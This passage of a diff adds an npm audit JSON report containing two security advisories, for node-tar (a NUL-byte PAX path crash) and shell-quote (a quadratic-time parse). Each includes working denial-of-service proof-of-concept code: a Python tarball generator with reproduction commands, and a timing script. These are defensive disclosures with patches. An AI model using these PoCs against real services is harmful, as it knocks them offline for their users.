b'root\\0'\n    b[329:337] = b'0000000\\0'\n    b[337:345] = b'0000000\\0'\n    b[345:345+len(prefix[:155])] = prefix[:155]\n    s = cksum(b)\n    b[148:156] = ('%06o\\0 ' % s).encode()\n    return bytes(b)\n\ndef pax(records):\n    body = b''\n    for k, v in records:\n        kv = b' ' + k + b'=' + v + b'\\n'\n        for digits in range(1, 8):\n            total = digits + len(kv)\n            if len(str(total)) == digits:\n                break\n        body += str(total).encode() + kv\n    return pad512(hdr(b'PaxHeader/poc', len(body), b'x') + body)\n\nout  = pax([(b'path', b'visible.txt\\x00hidden.txt')])  # NUL in PAX path\nout += hdr(b'placeholder', 1, b'0')\nout += pad512(b'A')\nout += b'\\0' * 1024  # end-of-archive\n\nopen('poc.tar', 'wb').write(out)\n```\n\n### Reproduction\n\n```bash\n# 1. Generate tarball\npython3 poc1-pax-prefix.py          # writes poc.tar (3 KB)\n\n# 2. Install vulnerable version\nmkdir repro && cd repro\nnpm init -y && npm install tar@7.5.16\n\n# 3. Try to extract with documented try/catch — observe uncaught exception\nmkdir -p ./out\nnode --input-type=module -e '\n  process.on(\"uncaughtException\", e => {\n    console.log(\"UNCAUGHT:\", e.code, \"-\", e.message);\n    process.exit(99);\n  });\n  import(\"tar\").then(async tar => {\n    try {\n      await tar.x({ file: \"../poc.tar\", cwd: \"./out\" });\n      console.log(\"NORMAL_RETURN\");\n    } catch (e) {\n      console.log(\"CAUGHT_BY_USER:\", e.code);\n    }\n  });'\n```\n\n### Observed output (verified 2026-06-23 against `tar@7.5.16`)\n\n```\nUNCAUGHT: ERR_INVALID_ARG_VALUE - The argument 'path' must be a string,\nUint8Array, or URL without null bytes.\nReceived '/.../out/visible.txt\\x00hidden.txt'\nexit: 99\n```\n\nThe exception bypasses the user's `try { await tar.x(...) } catch (e) { ... }` block and lands in the global `uncaughtException` handler. In a typical server without that handler, the process exits.\n\n---\n\n## Impact\n\n### Direct: remote DoS\n\nAny service that ingests attacker-supplied tarballs via node-tar inherits a one-tarball-kills-the-process primitive. Realistic deployments where this is reachable without user interaction:\n\n- npm registry tarball ingestion and downstream mirrors\n- GitHub Actions cache restore (`actions/cache`, `actions/setup-*` extracting toolchains)\n- Container image build pipelines that unpack layer tarballs through node tooling\n- Backup-restore services accepting user uploads\n- CI artifact processors and badge generators\n- Static-site / Docusaurus / Next.js build runners that fetch and extract dep tarballs\n- Cloud functions that auto-extract uploaded archives\n\nA correctly-coded consumer that does:\n\n```js\ntry {\n  await tar.x({ file: req.upload.path, cwd: tmpdir });\n} catch (e) {\n  return res.status(400).json({ error: 'bad archive' });\n}\n```\n\ndoes not catch this throw. The Node process dies and (depending on the supervisor) the worker may take time to respawn or never respawn if it dies during boot.\n\n### Secondary: parser-differential validator bypass (CWE-436)\n\n| Tool                       | Result for `path=visible.txt\\x00hidden.txt` |\n|----------------------------|----------------------------------------------|\n| GNU tar (`tar -tvf`)       | Lists `visible.txt` (truncated at NUL)      |\n| `bsdtar -tvf`              | Lists `visible.txt` (truncated at NUL)      |\n| Python `tarfile.list()`    | Lists `visible.txt\\x00hidden.txt` (raw)     |\n| node-tar `tar.t({file})`   | Emits raw NUL-bearing path (no crash)       |\n| node-tar `tar.x({file})`   | **Crashes** (uncaught throw)                |\n\nA pre-flight validator using GNU tar or bsdtar will see a benign filename; the subsequent node-tar extraction blows up. This is exploitable against any architecture that lists-and-validates-then-extracts.\n\n---\n\n## Suggested patch\n\nMatch the long-name handler in `parse.ts` — strip everything from the first NUL onward in `parseKVLine` value parsing:\n\n```diff\n--- a/src/pax.ts\n+++ b/src/pax.ts\n@@ -173,7 +173,7 @@ const parseKVLine = (set: Record<string, unknown>, line: string) => {\n\n   const k = r.replace(/^SCHILY\\.(dev|ino|nlink)/, '$1')\n\n-  const v = kv.join('=')\n+  const v = kv.join('=').replace(/\\0.*$/, '')\n   set[k] =\n     /^([A-Z]+\\.)?([mac]|birth|creation)time$/.test(k) ?\n       new Date(Number(v) * 1000)\n```\n\nThis matches `src/parse.ts:379` and `src/parse.ts:386` and closes both `path` and `linkpath` sinks in one change.\n\nA defense-in-depth follow-up: add an explicit `assert(!v.includes('\\0'))` (or fail-soft `return set`) at the top of `parseKVLine` so malformed PAX records that *aren't* path/linkpath also can't smuggle NUL into other unanticipated consumers (e.g. third-party readers of `entry.header.atime` Date objects constructed from `Number(v)` where `v` had embedded NUL).",
+      "reported_by": null,
+      "title": "node-tar: Uncaught Exception DoS via NUL byte in PAX path/linkpath records",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-59875"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "tar",
+      "vulnerable_versions": "<=7.5.16",
+      "github_advisory_id": "GHSA-gvwx-54wh-qm9j",
+      "recommendation": "Upgrade to version 7.5.17 or later",
+      "patched_versions": ">=7.5.17",
+      "updated": "2026-07-20T21:51:12.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-248"
+      ],
+      "url": "https://github.com/advisories/GHSA-gvwx-54wh-qm9j"
+    },
+    "1123944": {
+      "findings": [
+        {
+          "version": "1.8.4",
+          "paths": [
+            ".>nuxt>@nuxt/devtools>launch-editor>shell-quote"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/ljharb/shell-quote/security/advisories/GHSA-395f-4hp3-45gv\n- https://nvd.nist.gov/vuln/detail/CVE-2026-13311\n- https://github.com/ljharb/shell-quote/commit/7ff5488599d01c323514f02f5efb74088dd134ec\n- https://github.com/ljharb/shell-quote/releases/tag/v1.9.0\n- https://www.npmjs.com/package/shell-quote\n- https://github.com/advisories/GHSA-395f-4hp3-45gv",
+      "created": "2026-07-20T21:49:34.000Z",
+      "id": 1123944,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n`shell-quote`'s `parse()` finalizes its token list with a `reduce` that uses\n`Array.prototype.concat` as the accumulator. Each `prev.concat(arg)` copies the entire growing\narray, so `parse()` runs in **O(n²)** in the number of tokens. An unauthenticated attacker who\ncan submit a string to any code path that calls `parse()` on it can block the single-threaded\nNode.js event loop for tens of seconds with a small input — a denial of service. The trigger\nneeds **no shell metacharacters** (plain space-separated words suffice), so input filters that\nonly screen for `;`, `|`, `$`, or backticks do not help.\n\n### Root cause\n`parse.js` (lines 200–203), in `parseInternal` — this path runs on **every** `parse()` call:\n\n```js\n}).reduce(function (prev, arg) { // finalize parsed arguments\n    // TODO: replace this whole reduce with a concat\n    return typeof arg === 'undefined' ? prev : prev.concat(arg);\n}, []);\n```\n\n`prev.concat(arg)` allocates a new array and copies all of `prev` on every iteration, so\nproducing an N-token result costs `1 + 2 + … + N = O(N²)` copies. A second `acc.concat(s)`\nreduce in the `module.exports` wrapper (lines 211–224, reached only when `env` is a function)\nhas the same shape. The maintainer's own `// TODO: replace this whole reduce with a concat`\nalready flags the construct.\n\n### Proof of Concept\n```js\nconst { parse } = require('shell-quote');\nconst ms = fn => { const t = process.hrtime.bigint(); fn(); return Number(process.hrtime.bigint()-t)/1e6; };\nfor (const N of [16000, 32000, 64000, 128000]) {\n  console.log(N, 'tokens ->', ms(() => parse('x '.repeat(N))).toFixed(0), 'ms');\n}\n```\n\nMeasured on `shell-quote@1.8.4`, Node v24:\n\n| input (N tokens) | bytes  | `parse()` | ratio vs prev (2× input) |\n|-----------------:|-------:|----------:|:------------------------:|\n| 16 000           | 32 KB  |    678 ms | —                        |\n| 32 000           | 64 KB  |  4 169 ms | ×6.2                     |\n| 64 000           | 128 KB | 14 914 ms | ×3.6                     |\n| 128 000          | 256 KB | **57 319 ms** | ×3.8                 |\n\nTime grows ~×4 per 2× input → confirmed O(n²). A ~128 KB input blocks the event loop ~15 s;\n~256 KB → ~57 s; a few hundred KB more → minutes.\n<img width=\"656\" height=\"214\" alt=\"image\" src=\"https://github.com/user-attachments/assets/e8955b0e-0527-45ca-94b7-c3a2d8c0c82e\" />\n[poc.js](https://github.com/user-attachments/files/29255995/poc.js)\n\n### Impact\n`parse()` is synchronous on the main thread; while it copies arrays quadratically the entire\nevent loop is blocked and the process serves no other requests. Any service that calls `parse()`\non attacker-influenced input (command parsers, chat-ops / bot command handlers, REPLs,\nbuild-script / arg-string splitters) can be driven to a sustained DoS with a single small\nrequest. No code execution and no data disclosure — availability only.\n\nEnd-to-end confirmation: a minimal HTTP server that calls `parse()` on the request body, hit\nwith **one** `POST` of `'x '.repeat(32000)` (~63 KB), froze for ~4.5 s. An out-of-process probe\nclient issuing harmless `GET /ping` requests (normally ~1 ms) observed **27 consecutive pings\nstalled by up to 4374 ms** during that single request — i.e. every concurrent client was denied\nservice for the whole parse. Scaling the body to a few hundred KB extends the outage to minutes.\n\nThis is the same class as several accepted 2026 advisories for quadratic-parser DoS on\nuntrusted input (e.g. markdown-it CVE-2026-48988, js-yaml CVE-2026-53550,\npython-multipart CVE-2026-53539). It is **distinct** from the known `shell-quote`\ncommand-injection issues (CVE-2021-42740, CVE-2016-10541, CVE-2026-9277), which are all in\n`quote()`, not `parse()`.\n\n### Suggested remediation\nReplace the O(n²) concat-in-reduce with a linear flatten that **pushes into the\naccumulator** instead of reallocating and copying it on every iteration. Apply the\nsame shape to the wrapper's `acc.concat(s)` reduce. A defensive input-length cap on\n`parse()` is a cheap additional stop-gap.\n\n> **Maintainer note (edit):** the originally-suggested `Array.prototype.flat()` is\n> ES2019 / Node 11+, but `shell-quote` declares `engines: node >= 0.4`, so `.flat()`\n> would silently drop support for older runtimes. The fix instead flattens one-level\n> array tokens with `forEach`/`push` — and deliberately not `push.apply(...)`, since\n> spreading a large array into function arguments can exceed the engine's argument\n> count limit. Output is byte-identical to the current code across strings, `undefined`\n> holes, one-level array tokens, and `{op}`/`{comment}`/`{op:'glob'}` objects, and\n> finalizing is now linear (1,024,000 tokens in ~150 ms vs ~57 s for 128,000 before).\n> Thanks for the clear report and PoC — the analysis and reproduction were spot on.\n\n### Disclosure\nFound by source audit + wall-clock confirmation against 1.8.4 (and verified the same code is\npresent on `main`). Reported privately here; no public disclosure until a fix is available.",
+      "reported_by": null,
+      "title": "shell-quote: Quadratic-complexity Denial of Service in `parse()` (CWE-407)",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-13311"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "shell-quote",
+      "vulnerable_versions": "<=1.8.4",
+      "github_advisory_id": "GHSA-395f-4hp3-45gv",
+      "recommendation": "Upgrade to version 1.9.0 or later",
+      "patched_versions": ">=1.9.0",
+      "updated": "2026-07-20T21:49:34.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-395f-4hp3-45gv"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 1,
+      "moderate": 2,
+      "high": 4,
+      "critical": 1
+    },
+    "dependencies": 1355,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1355
+  }
+}
